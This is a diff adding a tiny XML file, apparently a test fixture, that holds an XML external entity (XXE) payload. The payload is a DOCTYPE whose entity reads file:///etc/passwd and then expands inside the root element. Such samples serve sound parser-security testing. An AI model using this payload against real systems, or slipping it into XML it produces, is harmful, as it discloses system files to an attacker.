@@ -1,0 +1,4 @@
+<!DOCTYPE asr [
+  <!ENTITY xxx SYSTEM "file:///etc/passwd">
+]>
+<nzr>&xxx;</nzr>
